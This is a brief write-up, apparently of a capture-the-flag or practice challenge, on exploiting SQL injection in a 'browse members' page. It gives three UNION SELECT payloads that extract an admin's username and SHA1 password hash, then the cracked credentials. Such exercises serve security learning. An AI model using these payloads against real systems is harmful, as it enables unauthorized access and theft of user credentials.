The browse members page is vulnerable to an SQL injection.
' UNION SELECT 1,2 from members -- // Checks columns in table members (easy to guess table name)
' UNION SELECT username,2 from members WHERE admin=1 -- // Shows us the username of someone with admin
' UNION SELECT password,2 from members where admin=1 -- // Shows us the password of someone with admin

Now we have a username, as well as a seemingly hashed password. Running the hashed password through a sha1 database
reveals that it is the sha1 hash of sup3r.

Username: bellamond
Password: sup3r
